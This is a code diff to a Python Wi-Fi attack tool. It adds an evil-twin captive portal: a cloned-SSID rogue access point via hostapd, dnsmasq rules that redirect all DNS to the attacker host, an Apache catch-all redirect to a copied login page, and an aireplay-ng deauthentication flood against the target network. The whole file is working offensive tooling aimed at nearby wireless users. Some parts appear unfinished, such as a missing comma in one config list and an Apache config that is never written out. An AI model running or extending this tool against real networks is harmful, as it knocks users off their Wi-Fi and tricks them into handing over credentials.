@@ -9,7 +9,8 @@ import glob
 requirements = ['hostapd',
                 'dnsmasq',
                 'dhclient',
-                'airmon-ng']
+                'airmon-ng',
+                'apache2']
 
 from terminal import (clear,
                       run_command,
@@ -29,9 +30,8 @@ from color import (red,
 
 
 def get_bssid_and_station_from_ap(interface, target_ap):
-
     print(f'Gathering Information on {target_ap}')
-    output,error = popen_command(f'airodump-ng -N {target_ap} {interface}',killtime=2)
+    output, error = popen_command(f'airodump-ng -N {target_ap} {interface}', killtime=2)
     if 'Failed initializing wireless card(s)' in output:
         print(f'Scan was not successful due to {green(interface)} being {red("DOWN")}')
         print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
@@ -46,6 +46,7 @@ def get_bssid_and_station_from_ap(interface, target_ap):
             if row[-2] and row[1]:
                 if row[-2] == target_ap and len(row[1]) == 17:
                     return row[1], row[6]
+
 
 def create_file_in_tmp(file, content):
     """
@@ -66,7 +67,7 @@ def create_file_in_tmp(file, content):
     print(f'{green(file)} created at {green(location)}')
 
 
-def dnsmasq(interface):
+def dnsmasq(interface,internet_facing_interface=None, captive_portal=False):
     conf_content = [
         f'interface={interface}',
         f"log-queries",
@@ -78,11 +79,24 @@ def dnsmasq(interface):
         f'server=8.8.8.8',
         f'address=/#/192.168.10.1'
     ]
+    if captive_portal:
+        conf_content = [
+            f'interface={interface}',
+            "log-queries",
+            "log-dhcp",
+            "dhcp-range=192.168.10.10,192.168.10.250,255.255.255.0,12h",
+            "dhcp-option=3,192.168.10.1",  # Default Gateway
+            "dhcp-option=6,192.168.10.1",  # DNS Server
+            "listen-address=127.0.0.1,192.168.10.1",
+            "server=8.8.8.8",  # Upstream DNS
+            f"except-interface={internet_facing_interface}"
+            "address=/#/192.168.10.1"  # Redirect all domains to the captive portal IP
+        ]
     create_file_in_tmp('dnsmasq.conf', conf_content)
     popen_command_new_terminal('dnsmasq -C /tmp/dnsmasq.conf -d')
 
 
-def hostapd(interface, target_ap, channel):
+def hostapd(interface, target_ap, channel, captive_portal=False, WPA2_PERSONAL=False):
     conf_content = [
         f'interface={interface}',
         f'driver=nl80211',
@@ -90,6 +104,36 @@ def hostapd(interface, target_ap, channel):
         f'ssid={target_ap}',
         f'channel={channel}',
     ]
+    if captive_portal:
+        conf_content = [
+            f'interface={interface}',
+            f'driver=nl80211',
+            f'ssid={target_ap}captive',
+            f'hw_mode=g',
+            f'channel={channel}',
+            f'wmm_enabled=0',
+            f'macaddr_acl=0',
+            f'auth_algs=1',
+            f'ignore_broadcast_ssid=0',
+        ]
+
+    if WPA2_PERSONAL:
+        conf_content = [
+            f'interface={interface}',
+            f'driver=nl80211',
+            f'ssid={target_ap}-WPA',
+            f'hw_mode=g',
+            f'channel={channel}',
+            f'wmm_enabled=0',
+            f'macaddr_acl=0',
+            f'auth_algs=1',
+            f'ignore_broadcast_ssid=0',
+            f'wpa=2',
+            f'wpa_passphrase=123123123',
+            f'wpa_key_mgmt=WPA-PSK',
+            f'wpa_pairwise=TKIP',
+            f'rsn_pairwise=CCMP',
+        ]
     create_file_in_tmp('hostapd.conf', conf_content)
     popen_command_new_terminal(f'hostapd /tmp/hostapd.conf')
 
@@ -104,27 +148,35 @@ def forwarding(interface, internet_facing_interface):
     run_command(f'iptables -A FORWARD -i {interface} -o {internet_facing_interface} -j ACCEPT')
 
 
-def rogue_ap(interface, internet_facing_interface, target_ap, channel,Called_from_EvilTwin=False):
+def rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_from_EvilTwin=False,
+             captive_portal=False):
     forwarding(interface, internet_facing_interface)
-    dnsmasq(interface)
-    hostapd(interface, target_ap, channel)
+    if captive_portal:
+        hostapd(interface, target_ap, channel, captive_portal=True)
+        dnsmasq(interface, internet_facing_interface=internet_facing_interface,captive_portal=True)
+    else:
+        dnsmasq(interface)
+
+        hostapd(interface, target_ap, channel)
     if not Called_from_EvilTwin:
         input('Press Enter to Quit Rogue AP')
         close(interface, internet_facing_interface)
     if Called_from_EvilTwin:
         return
 
-def aireplay(interface,bssid,channel):
-    switch_interface_channel(interface,channel)
+
+def aireplay(interface, bssid, channel):
+    switch_interface_channel(interface, channel)
     popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {bssid} --ignore-negative-one {interface}')
 
-def create_new_interface(interface,channel):
+
+def create_new_interface(interface, channel):
     """
     Issue 1
     :param interface:
     :return:
     """
-    monitor_interface = interface+'clone' # monitor interface from main interface to be used in aireplay-ng since we cant use wlan0 for both hostapds and aireplay at the same time
+    monitor_interface = interface + 'clone'  # monitor interface from main interface to be used in aireplay-ng since we cant use wlan0 for both hostapds and aireplay at the same time
     output = check_output('iw dev')
     lines = output.split('\n')
     phy = '12'
@@ -138,6 +190,36 @@ def create_new_interface(interface,channel):
     return monitor_interface
 
 
+def config_apache2_for_captive_portal():
+    config_content = [
+        '''
+        <VirtualHost *:80>
+	        ServerAdmin webmaster@localhost
+	        DocumentRoot /var/www/html
+
+	        ErrorLog ${APACHE_LOG_DIR}/error.log
+        	CustomLog ${APACHE_LOG_DIR}/access.log combined
+        	
+        	RedirectMatch 302 ^/$ /index.html
+        	
+        	RedirectMatch 302 ^/.*$ /index.html
+
+
+</VirtualHost>
+
+        '''
+    ]
+
+    run_command('systemctl start apache2')
+
+
+
+def send_webpage_to_apache2():
+    address_template = './captive_portal_html/{}/index.html'
+    destination = '/var/www/html/'
+    webpage = address_template.format('temp')
+    run_command_print_output(f'cp {webpage} {destination}')
+
 
 def evil_twin_deauth(interface, internet_facing_interface, target_ap):
     """
@@ -148,18 +230,22 @@ def evil_twin_deauth(interface, internet_facing_interface, target_ap):
     :param target_ap:
     :return:
     """
-    bssid,channel = get_bssid_and_station_from_ap(interface,target_ap)
-    mon = create_new_interface(interface,channel)
-    aireplay(mon,bssid,channel)
-    rogue_ap(interface,internet_facing_interface,target_ap,channel,Called_from_EvilTwin=True)
+    bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
+    send_webpage_to_apache2()
+    monitor_interface = create_new_interface(interface, channel)
+    # aireplay(monitor_interface,bssid,channel)
+    rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_from_EvilTwin=True, captive_portal=True)
     input('Press Enter to Quit Evil Twin')
-    close(interface, internet_facing_interface)
-def close(interface, internet_facing_interface,called_from_evil_twin=False):
+    close(interface, internet_facing_interface, monitor_interface)
+
+
+def close(interface, internet_facing_interface, monitor_interface, called_from_evil_twin=False):
     if called_from_evil_twin:
         run_command('killall aireplay-ng')
     run_command('killall hostapd')
     run_command('killall dnsmasq')
-    run_command(f'dhclient -r {interface}') #resets interface ip to original
+    run_command(f'iw {monitor_interface} del')
+    run_command(f'dhclient -r {interface}')  # resets interface ip to original
     run_command("iptables --flush")
     run_command("iptables --flush -t nat")
     run_command("iptables --delete-chain")
@@ -170,3 +256,4 @@ def close(interface, internet_facing_interface,called_from_evil_twin=False):
     run_command(f'iptables -D FORWARD -i {interface} -o {internet_facing_interface} -j ACCEPT')
     run_command(f'killall dhclient')
     run_command(f'systemctl restart NetworkManager')
+    run_command(f'systemctl restart apache2')
